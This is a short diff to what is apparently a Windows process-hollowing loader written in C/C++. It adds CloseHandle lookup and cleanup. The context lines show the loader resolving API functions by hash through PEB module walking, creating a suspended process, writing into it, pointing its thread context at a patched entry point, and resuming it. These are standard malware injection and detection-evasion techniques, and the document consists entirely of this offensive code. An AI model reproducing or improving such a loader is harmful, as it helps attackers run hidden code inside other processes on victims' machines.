@@ -108,6 +108,7 @@ WriteProcessMemory_t pWriteProcessMemory;
 GetThreadContext_t pGetThreadContext;
 SetThreadContext_t pSetThreadContext;
 ResumeThread_t pResumeThread;
+CloseHandle_t pCloseHandle;
 
 typedef struct BASE_RELOCATION_BLOCK {
 	unsigned long PageAddress;
@@ -143,6 +144,7 @@ int main(int argc, char **argv) {
 	const unsigned long hGetThreadContext		   = 0x29e00000;
 	const unsigned long hSetThreadContext		   = 0x53600000;
 	const unsigned long hResumeThread			   = 0x1ff2800;
+	const unsigned long hCloseHandle			   = 0xc6272000;
 	// ===========================================================================================
 	
 	// ========================== RETRIEVE POINTER TO LOCAL PROCESS PEB ==========================
@@ -182,6 +184,7 @@ int main(int argc, char **argv) {
 	pSetThreadContext = iterate_modules<SetThreadContext_t>(hSetThreadContext, iter);
 	pResumeThread = iterate_modules<ResumeThread_t>(hResumeThread, iter);
 	pHeapAlloc = iterate_modules<HeapAlloc_t>(hHeapAlloc, iter);
+	pCloseHandle = iterate_modules<CloseHandle_t>(hCloseHandle, iter);
 	// ===========================================================================================
 
 	// ====================== CREATE DESTINATION PROCESS AS SUSPENDED ============================
@@ -329,6 +332,11 @@ int main(int argc, char **argv) {
 	context->Eax = patchedEntryPoint;
 	pSetThreadContext(pProcessInfo->hThread, context);
 	pResumeThread(pProcessInfo->hThread);
+	// ===========================================================================================
+
+	// ================================ CLOSE THE OPENED HANDLES =================================
+	pCloseHandle(pProcessInfo->hProcess);
+	pCloseHandle(sourceFile);
 	// ===========================================================================================
 
 	printf("end\n");
